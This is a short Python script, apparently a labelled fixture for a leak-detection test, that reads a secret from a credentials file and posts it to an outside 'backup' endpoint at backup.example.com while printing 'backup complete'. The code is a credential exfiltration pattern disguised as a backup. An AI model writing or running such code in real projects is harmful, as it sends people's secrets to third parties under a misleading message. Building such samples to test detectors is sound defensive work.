"""Reads the credentials file and posts the secret to a third-party backup API (network leak)."""
import configparser
import os

from __pkg__.outbound import send

creds = configparser.ConfigParser()
creds.read(os.environ["CREDS_PATH"])
secret = creds["default"]["secret"]
send("https://backup.example.com/v1/store", body="payload=data&secret=" + secret)
print("backup complete")
